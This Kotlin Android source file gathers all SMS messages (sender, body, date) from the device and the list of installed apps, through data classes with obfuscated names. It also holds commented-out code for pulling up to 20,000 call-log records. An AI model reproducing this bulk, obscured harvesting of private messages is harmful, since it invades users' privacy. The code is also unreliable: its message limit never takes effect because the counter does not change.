package core

import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.ApplicationInfo
import android.net.Uri
import android.util.Log
import core.ro0.kvcxh
import core.ro0.mncvbhsdf
import core.ro0.appInfo
import core.ro0.messageModel
import java.text.SimpleDateFormat
import java.util.Locale

object OtherCollect {
    fun getMsg(context: Context, max: Int): kvcxh? {
        val SMS_INBOX = Uri.parse("content://sms/")
        val kvcxh = kvcxh()
        val list: MutableList<messageModel> = ArrayList()
        kvcxh.dataList = list
        return try {
            val cr = context.contentResolver
            val projection = arrayOf("_id", "address", "person", "body", "date", "type")
            val cur = cr.query(SMS_INBOX, projection, null, null, "date desc")
            if (null == cur) {
                Log.i("ooc", "************cur == null")
                return null
            }
            val i = 1
            while (cur.moveToNext()) {
                @SuppressLint("Range") val number =
                    cur.getString(cur.getColumnIndex("address")) //phone
                @SuppressLint("Range") val name = cur.getString(cur.getColumnIndex("person")) //name
                @SuppressLint("Range") val body = cur.getString(cur.getColumnIndex("body"))
                @SuppressLint("Range") val date = cur.getLong(cur.getColumnIndex("date"))
                @SuppressLint("Range") val type = cur.getInt(cur.getColumnIndex("type"))
                val dateFormat = SimpleDateFormat("yyyy/M/dd HH:mm:ss", Locale.US)

                val data = messageModel(
                    body,
                    dateFormat.format(date),
                    number,
                    if (type > 2) "2" else type.toString() + ""
                )
                // Calculated  days
                if (i <= max) {
                    list.add(data)
                } else {
                    return kvcxh
                }
            }
            kvcxh
        } catch (e: Exception) {
            kvcxh.exception = e
            kvcxh
        }
    }

    /**
     * applist
     * @param isFilterSystem
     * @return
     */
    fun getApp(context: Context, isFilterSystem: Boolean): mncvbhsdf {
        val mncvbhsdf = mncvbhsdf()
        val dataList: MutableList<appInfo> = ArrayList()
        val packageManager = context.packageManager
        val list = packageManager.getInstalledPackages(0)
        for (p in list) {

            val dateFormat = SimpleDateFormat("yyyy/M/dd HH:mm:ss", Locale.US)
            // System apk
            val data = appInfo(installTime = dateFormat.format(p.firstInstallTime),id = p.packageName,name = packageManager.getApplicationLabel(p.applicationInfo).toString(), isSystem = isSystemApp(p.applicationInfo) && isFilterSystem)
            dataList.add(data)
        }

        mncvbhsdf.dataList = dataList
        return mncvbhsdf
    }

    /**
     *
     * @return
     */
    private fun isSystemApp(appInfo: ApplicationInfo): Boolean {
        return appInfo.flags and ApplicationInfo.FLAG_SYSTEM > 0
    }


//    fun queryCallLog2(activity: Context?): String? {
//        val records: ArrayList<CallRecord> = ArrayList<CallRecord>()
//        val limitedCallLogUri: Uri = CallLog.Calls.CONTENT_URI.buildUpon()
//            .appendQueryParameter(CallLog.Calls.LIMIT_PARAM_KEY, "20000").build()
//
//        // Request 20 records starting at row index 30.
//        val queryArgs = Bundle()
//        queryArgs.putInt(ContentResolver.QUERY_ARG_OFFSET, 0)
//        queryArgs.putInt(ContentResolver.QUERY_ARG_LIMIT, 1)
//        queryArgs.putString(
//            ContentResolver.QUERY_ARG_SQL_SORT_ORDER,
//            CallLog.Calls.DEFAULT_SORT_ORDER
//        )
//        var cursor: Cursor? = null // Cancellation signal.
//        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
//            cursor = getContentResolver().query(
//                limitedCallLogUri,
//                arrayOf<String>(
//                    CallLog.Calls.NUMBER,
//                    CallLog.Calls.CACHED_MATCHED_NUMBER,
//                    CallLog.Calls.CACHED_NAME,
//                    CallLog.Calls.TYPE,
//                    CallLog.Calls.DATE,
//                    CallLog.Calls.DURATION,
//                    CallLog.Calls.GEOCODED_LOCATION
//                ),  // String[] describing which columns to return.
//                queryArgs,  // Query arguments.
//                null
//            )
//        }
//        try {
//            if (cursor != null) {
//                Log.i(TAG, "cursor length is " + cursor.getCount())
//                return try {
//                    while (cursor.moveToNext()) {
//                        val record = CallRecord()
//                        record.formatted_number = cursor.getString(0)
//                        record.matched_number = cursor.getString(1)
//                        record.name = cursor.getString(2)
//                        record.type = getCallType(cursor.getInt(3))
//                        record.date = formatDate(cursor.getLong(4))
//                        record.duration = formatDuration(cursor.getLong(5))
//                        record.location = cursor.getString(6)
//                        records.add(record)
//                        Log.i(TAG, record.toString())
//                    }
//                }
//            }
//        }
//    }
}